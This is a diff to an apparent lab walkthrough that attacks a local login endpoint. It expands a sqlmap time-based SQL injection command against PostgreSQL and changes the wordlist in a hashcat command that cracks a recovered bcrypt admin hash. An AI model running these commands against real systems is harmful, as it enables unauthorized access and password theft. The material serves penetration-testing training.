@@ -173,7 +173,16 @@ echo ""
 echo "Recovered hash: ${HASH}"
 ```
 
-> In a real engagement, use **sqlmap**: `sqlmap -u http://localhost:5001/bff/auth/login --data '{"username":"*","password":"x"}' --technique=T --dbms=PostgreSQL --level=5`
+> In a real engagement, use **sqlmap**:
+```
+python sqlmap.py -u 'http://localhost:5001/bff/auth/login' \
+  --data '{"username":"*","password":"x"}' \
+  --technique=T \
+  --dbms=PostgreSQL \
+  --level=5 \
+  --ignore-code=401 \
+  --headers="Content-Type: application/json"
+```
 
 ---
 
@@ -181,10 +190,10 @@ echo "Recovered hash: ${HASH}"
 
 ```bash
 echo '$2b$10$<rest of hash>' > hash.txt
-hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 3200 hash.txt /usr/share/wordlists/passwords.txt
 ```
 
-`Admin1234!` is in rockyou.txt. Expect a result within seconds on a GPU, minutes on CPU.
+`Admin1234!` is in many wordlists. Expect a result within seconds on a GPU, minutes on CPU.
 
 ---
 
